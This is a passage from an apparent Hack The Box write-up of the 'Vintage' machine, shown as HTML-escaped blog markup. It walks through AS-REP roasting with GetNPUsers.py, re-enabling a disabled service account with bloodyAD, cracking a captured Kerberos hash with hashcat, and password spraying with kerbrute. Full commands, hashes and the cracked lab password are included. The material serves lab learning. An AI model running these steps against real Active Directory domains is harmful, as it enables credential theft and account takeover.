&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User R.Verdi doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User L.Bianchi doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User G.Viola doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User C.Neri doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User P.Rosa doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Kerberos SessionError: KDC_ERR_CLIENT_REVOKED&lt;span class="o">(&lt;/span>Clients credentials have been revoked&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$krb5asrep$23$svc_ldap&lt;/span>@VINTAGE.HTB:8935004afc9c3df69eb0a5bc47621d8b&lt;span class="nv">$e5eebf50edc698bd3f5e5c09d2775d050799b52e8831a0208d336223e0b74c9955a7857b1abe5688acdc44499e6ef32de5dddb38d60fb2d326bc6e4f65068f2f6c1ba6667359aad9a39dd7e02c2acb8609437143bae142fbdc64bf91f0140be899a0f38a7440c926769fbfabc7827ded393e143106b6a18731eb9456b7a3e41ac4b8865012fc70206a7a73ef0216d1452bfe45bbdc348a1fc26e733e7f8626599981edcba9f57e2c69b084d8a8a6955c2bd552a0f7b2479f3b11c93138bed924d0202fcb76dd7d9fa2f56e6295db55ce1f545f1195985aae0eb7e1b3197f03e68bc825017568e5ef6a23&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$krb5asrep$23$svc_ark&lt;/span>@VINTAGE.HTB:aaa9f68a14fd7e389d65ffa9be7f6a5e&lt;span class="nv">$ebe016f470e83e0976cdca9250bf63015b67b4c8aafef4dd15c302f69fbb68cd47623cb559ce38ad202993edca154960e7f6ec8a28be9506502ad1e8f3b4df9996ac41db60fa02442adcf07b5483d0b068ef4beb983fa0f9b0a059bd884be6c6b409ea070a5e605e096ec88f8e9efeeb8f6434ce9df9d27c4deca383a4c688a7a8e8c916c32c8901057a3204d2e75b8117676bf35de1324d8442d3cd801613056d940f3e1eed4fb7c8c085d16a60e42e7d6496fec559e5e530eaa898da11c158144dcc524de67c9bd511c600a01f04801910be17c5620eec9bfd80208b3bd4009cc00e87601a71532af9&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User C.Neri_adm doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User L.Bianchi_adm doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I checked the &lt;code>userAccountControl&lt;/code> of all account and it seems that the &lt;code>svc_sql&lt;/code> is disabled as it have &lt;code>ACCOUNTDISABLE&lt;/code> .&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ bloodyAD --host &lt;span class="s2">&amp;#34;dc01.vintage.htb&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;vintage.htb&amp;#34;&lt;/span> --kerberos --dc-ip 10.10.11.45 -k get search --filter &lt;span class="s2">&amp;#34;(objectClass=user)&amp;#34;&lt;/span> --attr userAccountControl
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;SNIP&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">distinguishedName: &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>svc_sql,OU&lt;span class="o">=&lt;/span>Pre-Migration,DC&lt;span class="o">=&lt;/span>vintage,DC&lt;span class="o">=&lt;/span>htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">userAccountControl: ACCOUNTDISABLE&lt;span class="p">;&lt;/span> NORMAL_ACCOUNT&lt;span class="p">;&lt;/span> DONT_EXPIRE_PASSWORD&lt;span class="p">;&lt;/span> DONT_REQ_PREAUTH
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">distinguishedName: &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>svc_ldap,OU&lt;span class="o">=&lt;/span>Pre-Migration,DC&lt;span class="o">=&lt;/span>vintage,DC&lt;span class="o">=&lt;/span>htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">userAccountControl: NORMAL_ACCOUNT&lt;span class="p">;&lt;/span> DONT_EXPIRE_PASSWORD&lt;span class="p">;&lt;/span> DONT_REQ_PREAUTH
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">distinguishedName: &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>svc_ark,OU&lt;span class="o">=&lt;/span>Pre-Migration,DC&lt;span class="o">=&lt;/span>vintage,DC&lt;span class="o">=&lt;/span>htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">userAccountControl: NORMAL_ACCOUNT&lt;span class="p">;&lt;/span> DONT_EXPIRE_PASSWORD&lt;span class="p">;&lt;/span> DONT_REQ_PREAUTH
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">distinguishedName: &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>C.Neri_adm,CN&lt;span class="o">=&lt;/span>Users,DC&lt;span class="o">=&lt;/span>vintage,DC&lt;span class="o">=&lt;/span>htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">userAccountControl: NORMAL_ACCOUNT&lt;span class="p">;&lt;/span> DONT_EXPIRE_PASSWORD
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">distinguishedName: &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>L.Bianchi_adm,CN&lt;span class="o">=&lt;/span>Users,DC&lt;span class="o">=&lt;/span>vintage,DC&lt;span class="o">=&lt;/span>htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">userAccountControl: NORMAL_ACCOUNT&lt;span class="p">;&lt;/span> DONT_EXPIRE_PASSWORD
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So i enabled it using &lt;code>bloodyAD&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ bloodyAD --host dc01.vintage.htb -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;ACCOUNTDISABLE&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span> property flags removed from SVC_SQL&lt;span class="err">&amp;#39;&lt;/span>s userAccountControl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I retried again and it succeed this time !&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ GetNPUsers.py -dc-ip 10.10.11.45 -request -usersfile users.txt vintage.htb/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/home/ayoub/.local/bin/GetNPUsers.py:150: DeprecationWarning: datetime.datetime.utcnow&lt;span class="o">()&lt;/span> is deprecated and scheduled &lt;span class="k">for&lt;/span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now&lt;span class="o">(&lt;/span>datetime.UTC&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">now&lt;/span> &lt;span class="o">=&lt;/span> datetime.datetime.utcnow&lt;span class="o">()&lt;/span> + datetime.timedelta&lt;span class="o">(&lt;/span>&lt;span class="nv">days&lt;/span>&lt;span class="o">=&lt;/span>1&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User Administrator doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User DC01$ doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User gMSA01$ doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User FS01$ doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User M.Rossi doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User R.Verdi doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User L.Bianchi doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User G.Viola doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User C.Neri doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User P.Rosa doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$krb5asrep$23$svc_sql&lt;/span>@VINTAGE.HTB:e9d5b32940352f3bf4114333d1930da0&lt;span class="nv">$29&lt;/span>a8e947b96a344e92180206c1ae5c51db3f0010ebfb984e6bd10492e2474a7e0a45092b804851ad968d2149846d777e1ce5cc590fff164ae11a16eb605892cd97e92f141fe173a6e18ceee689e1ace5da268f43991f185bc55cde86289872307ad44e9b8d3301062563af6d9d24c4fb0796103dad11ef11e4057d9123f45d86c7e14096e611a50f51bb51027278484545694cd54671d9dd41fe89df741bf3d01a01606f9f5e57341e1d64d4f28b5a6dfa70b44889762f8794be2ce5cbb6aeaf2a767011ad0dc46360bd52a22e1de87ac741d41150bcfd97ed64394b947808e19f7a779991a517c44fb7
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$krb5asrep$23$svc_ldap&lt;/span>@VINTAGE.HTB:90958306658dd10b4c019c56ef39fe1e&lt;span class="nv">$ce6a47b7f4337142af32290cd30a37be714d54c6d956bd9af3254e361a222a844be5985b55295f3cdbb2a9e245fd7d1b80e18fcd4d09dc0c4393a7d664a6d6d9cfc8ea51b24163cb60f372bf7f71c4cea2d73f5df40fff74ea106e0e0cd2cd23e59ca884b61c2a42e69a364752020e5575a0a60274850921bc8e731c1324fb6e07b32e1b3fabed928521599f749694b69bbae00d9e703140c329be90c73c457cf98fc0e128a969308227857aacc8f361c3e40ba519c4018c855cf8f734005d4e8a5ab0e94d3c265e390258d40ec80bb3848ea31cd13fa8069ee25f893bbcf353a90b8aba75d6bcf9d24c&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$krb5asrep$23$svc_ark&lt;/span>@VINTAGE.HTB:b95d1f54813715a9fc875f1940d5cab6&lt;span class="nv">$ca10e91db21c4dea427b67a1226434ea1797350c9e0c7067940526248caca9b64ed9739cbdc059946da19f040ba43654166dc0d474b9d3beeb4ba56de6c457d5c53dcb2464a360b87770ec3c4de29495725c481836dd6c56fda373080cfe41eb56ef895091799ea02759feb49066ef4259672cb913c383ef6ae96b45d65c6109b9c60c89589b450d6b645f97088d99ecc7bee735173b120099188b07ca410e7f27c7871b33c5684a7f565bb03dfea7e3794d572a1e874ab82dc40726ad999a5fa0a65aae731e6f13af160e14c74c3d1a6f6ce5d75eb4ad537f7f82301bc9e687b80407ec023c9f9d5df4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> User C.Neri_adm doesn&lt;span class="s1">&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[-] User L.Bianchi_adm doesn&amp;#39;&lt;/span>t have UF_DONT_REQUIRE_PREAUTH &lt;span class="nb">set&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I tried cracking these hashes using &lt;code>hashcat&lt;/code> but only &lt;code>svc_sql&lt;/code> end up being crackable and the password is &lt;code>Zer0the0ne&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-Powershell" data-lang="Powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Windows&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">hashcat&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">6.2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">6&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="n">hashcat&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-m&lt;/span> &lt;span class="mf">18200&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">razio&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">hash&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">SNIP&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Dictionary&lt;/span> &lt;span class="n">cache&lt;/span> &lt;span class="n">hit&lt;/span>&lt;span class="err">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span> &lt;span class="n">Filename&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">razio&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Desktop&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">rockyou&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span> &lt;span class="n">Passwords&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">14344385&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span> &lt;span class="n">Bytes&lt;/span>&lt;span class="p">.....&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">139921507&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">*&lt;/span> &lt;span class="n">Keyspace&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">14344385&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$krb5asrep$23$svc_sql@VINTAGE&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">HTB&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">e9d5b32940352f3bf4114333d1930da0&lt;/span>&lt;span class="nv">$29a8e947b96a344e92180206c1ae5c51db3f0010ebfb984e6bd10492e2474a7e0a45092b804851ad968d2149846d777e1ce5cc590fff164ae11a16eb605892cd97e92f141fe173a6e18ceee689e1ace5da268f43991f185bc55cde86289872307ad44e9b8d3301062563af6d9d24c4fb0796103dad11ef11e4057d9123f45d86c7e14096e611a50f51bb51027278484545694cd54671d9dd41fe89df741bf3d01a01606f9f5e57341e1d64d4f28b5a6dfa70b44889762f8794be2ce5cbb6aeaf2a767011ad0dc46360bd52a22e1de87ac741d41150bcfd97ed64394b947808e19f7a779991a517c44fb7&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">Zer0the0ne&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As always, once getting a new password i perform a password spraying using &lt;code>kerbrute&lt;/code> on the rest of the accounts and check for password reuse. And it seems that &lt;code>C.Neri&lt;/code> has the same password.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Vintage&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ kerbrute passwordspray -d vintage.htb --dc 10.10.11.45 ./users.txt &lt;span class="s1">&amp;#39;Zer0the0ne&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> __ __ __
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> / /_____ _____/ /_ _______ __/ /____
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> / //_/ _ &lt;span class="se">\/&lt;/span> ___/ __ &lt;span class="se">\/&lt;/span> ___/ / / / __/ _ &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> / ,&amp;lt; / __/ / / /_/ / / / /_/ / /_/ __/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/_/&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>&lt;span class="se">\_&lt;/span>__/_/ /_.___/_/ &lt;span class="se">\_&lt;/span>_,_/&lt;span class="se">\_&lt;/span>_/&lt;span class="se">\_&lt;/span>__/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Version: dev &lt;span class="o">(&lt;/span>9cfb81e&lt;span class="o">)&lt;/span> - 03/17/25 - Ronnie Flathers @ropnop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025/03/17 23:50:27 &amp;gt; Using KDC&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025/03/17 23:50:27 &amp;gt; 10.10.11.45:88
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025/03/17 23:50:28 &amp;gt; &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> VALID LOGIN: C.Neri@vintage.htb:Zer0the0ne
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2025/03/17 23:50:28 &amp;gt; Done! Tested &lt;span class="m">17&lt;/span> logins &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> successes&lt;span class="o">)&lt;/span> in 0.606 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Once again i will get back to &lt;code>Bloodhound&lt;/code> and see what we can do with this account. And &lt;code>C.Neri&lt;/code> has &lt;code>canPSRemote&lt;/code> to the &lt;code>DC01&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound6.png"
width="496"
height="213"
srcset="https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound6_hu_1ff99e0263491249.png 480w, https://r4z1o.github.io/p/vintage-htb-writeup/Bloodhound6_hu_55ce82d17f5ca058.png 1024w"
loading="lazy"
alt="Bloodhound"
class="gallery-image"
data-flex-grow="232"
data-flex-basis="558px"
>&lt;/p>
&lt;p>Next thing i will do is get a TGT for this account and export it to the &lt;code>KRB5CCNAME&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
